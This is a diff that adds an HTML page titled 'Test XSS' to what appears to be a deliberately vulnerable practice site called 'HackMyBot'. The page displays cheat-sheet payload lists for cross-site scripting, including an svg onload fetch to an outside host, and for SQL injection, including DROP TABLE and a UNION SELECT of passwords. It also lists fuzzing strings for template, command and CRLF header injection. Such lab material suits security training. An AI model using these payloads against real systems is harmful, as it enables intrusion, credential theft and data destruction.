@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Test XSS</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <div class="header">
+        <nav class="navbar navbar-expand-lg navbar-light bg-light container">
+            <div class="d-flex justify-content-between w-100 align-items-center">
+                <div>
+                    <a class="navbar-brand" href="#">HackMyBot</a>
+                    <a class="nav-link d-inline" href="/">Articles</a>
+                    <a class="nav-link d-inline" href="/report">Report</a>
+                </div>
+                <div class="search-bar input-group">
+                    <input type="text" id="search-input" placeholder="Search..." class="form-control">
+                    <div class="input-group-append">
+                        <span class="input-group-text" id="search-icon"><i class="fas fa-search"></i></span>
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </div>
+    <!-- Error Message -->
+    <div id="no-match-message" style="text-align: center; color: red; margin-top: 20px;"></div>
+    
+    <div class="container">
+        <div class="row">
+            <div class="col-md-4 article-box">
+                <div class="article-title">XSS Injection</div>
+                <div class="article-content">
+                    <ul>
+                      <br>
+                      <h5>Payloads</h5>
+                      <li>&lt;script&gt;alert(1)&lt;/script&gt;</li>
+                      <li>&lt;img src=x onerror=print()&gt; </li>
+                      <li>&lt;img src="javascript:alert('XSS')"&gt;</li>
+                      <li>&lt;svg/onload=fetch('https://aa.com')&gt;</li>
+                      <br>
+                      <h5>No-interactions events</h5>
+                      <li>onfocus, onstart, onbeforeunload, onhashchange, ontoggle
+                    </ul>
+                </div>
+            </div>
+            <div class="col-md-4 article-box">
+                <div class="article-title">SQL Injection</div>
+                <div class="article-content">
+                    <ul>
+                      <br>
+                      <h5>Payloads</h5>
+                      <li>' OR '1'='1 </li> 
+                      <li>'; DROP TABLE users;</li> 
+                      <li>' UNION SELECT 1, username, password FROM users -- </li>
+                      <br>
+                      <h5>Identify backend</h5>
+                      <li>sleep(10) #mysql 
+                      <li>pg_sleep(10) #Postgresql 
+                      <li>WAITFOR DELAY '0:0:10' # MSQL
+                    </ul>
+                </div>
+            </div>
+            <div class="col-md-4 article-box">
+                <div class="article-title">Fuzzing</div>
+                <div class="article-content">
+                    <ul>
+                      <br>
+                      <h5>Payloads</h5>
+                      <li>&lcub;&lcub;2*2&rcub;&rcub;${3*3}<%= 4*4 %>#{5*5}</li>
+                      <li>mail+`id`&lcub;&lcub;3*3&rcub;&rcub;<?php>|'or''='@data.com</li>
+                      <li>1;sleep${IFS}5;#${IFS}';</li>
+                      <li>%0d%0aLocation:%20http://aa.com</li>
+                      <li>1&lt;a&gt;&lt;scr&lt;object&gt;ipt&gt;alert()&lt;/script&gt;2</li>
+
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/js/script.js"></script>
+</body>
+</html>
